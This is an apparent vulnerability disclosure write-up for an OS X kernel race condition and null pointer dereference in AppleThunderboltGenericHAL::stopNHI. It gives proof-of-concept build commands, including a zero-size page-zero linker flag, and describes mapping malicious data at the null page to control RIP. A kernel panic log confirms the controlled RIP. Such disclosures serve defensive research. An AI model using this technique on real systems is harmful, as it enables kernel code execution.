# Vulnerability
 - Race Condition
 - Null Pointer Dereference

## POC
 - Note that you need root privilege to reproduce POC.
 - clang++ poc.cpp -o poc -lpthread -framework IOKit -framework CoreFoundation -m32 -Wl,-pagezero_size,0
 - sudo ./poc

## Environment
 - Tested on lasted OSX Beta (10.11.6 Public Beta 2, 15G12a)
 - Tested on MacBook Pro (Retina, 15-inch, Mid 2014)

## Detail
The Vulnerable method is AppleThunderboltGenericHAL::stopNHI in AppleThunderboltHAL service. (Selector : 1)

There is no locking function to prevent access the object from other thread.

We can race this method by running two threads and lead to use null page.

Also, We mapped the malicious data at null page before trig vulnerability.

So, OS X will reference it, we can control the RIP.

## Log
```
========================== Panic log ===============================
Mon Jun 13 17:25:48 2016

*** Panic Report ***
panic(cpu 6 caller 0xffffff800e1cf69a): Kernel trap at 0xffffffff41160613, type 14=page fault, registers:
CR0: 0x000000008001003b, CR2: 0xffffffff41160613, CR3: 0x00000003c765b0c7, CR4: 0x00000000001627e0
RAX: 0x0000000000000000, RBX: 0xffffff802e853600, RCX: 0x000000000003d0a8, RDX: 0x0000000000000001
RSP: 0xffffff81fa283bc8, RBP: 0xffffff81fa283be0, RSI: 0x0000000000000002, RDI: 0x0000000000000000
R8:  0xffffff804d1e7000, R9:  0x0000000000000001, R10: 0x0000000000000000, R11: 0x0000009050be0a2c
R12: 0xffffff802fbb00b4, R13: 0x0000000000000000, R14: 0x0000000000000000, R15: 0x0000000000000000
RFL: 0x0000000000010282, RIP: 0xffffffff41160613, CS:  0x0000000000000008, SS:  0x0000000000000010
Fault CR2: 0xffffffff41160613, Error code: 0x0000000000000010, Fault CPU: 0x6, PL: 0

Backtrace (CPU 6), Frame : Return Address
0xffffff81fa283850 : 0xffffff800e0dbb52 
0xffffff81fa2838d0 : 0xffffff800e1cf69a 
0xffffff81fa283ab0 : 0xffffff800e1ed503 
0xffffff81fa283ad0 : 0xffffffff41160613 <- RIP Controlled.
0xffffff81fa283be0 : 0xffffff800e6e0817 
0xffffff81fa283d20 : 0xffffff800e198f50 
0xffffff81fa283e30 : 0xffffff800e0e02c3 
0xffffff81fa283e60 : 0xffffff800e0c38f8 
0xffffff81fa283ea0 : 0xffffff800e0d36a5 
0xffffff81fa283f10 : 0xffffff800e1b9c65 
0xffffff81fa283fb0 : 0xffffff800e1edad8 

BSD process name corresponding to current thread: poc

Mac OS version:
15G12a
========================== Panic log ===============================
```

## Post Script
* Special Thanks to daybreaker.

## Reference
 - https://support.apple.com/en-us/HT207275

